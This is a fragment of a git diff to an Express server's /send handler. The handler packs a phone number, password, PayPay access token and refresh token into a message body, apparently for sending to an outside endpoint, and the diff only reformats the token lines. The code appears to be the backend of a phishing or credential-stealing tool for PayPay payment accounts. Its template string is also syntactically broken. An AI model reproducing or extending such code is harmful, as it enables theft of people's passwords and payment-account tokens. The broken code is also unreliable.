@@ -58,8 +58,7 @@ app.post("/send", async (req, res) => {
       },
       body: JSON.stringify({
         content: `\n電話番号: ${phone}\nパスワード: ${password}`
-        PayPayアクセストークン: ${accessToken}
-リフレッシュトークン: ${refreshToken}`
+        PayPayアクセストークン: ${accessToken}リフレッシュトークン: ${refreshToken}`
       })
     });
 
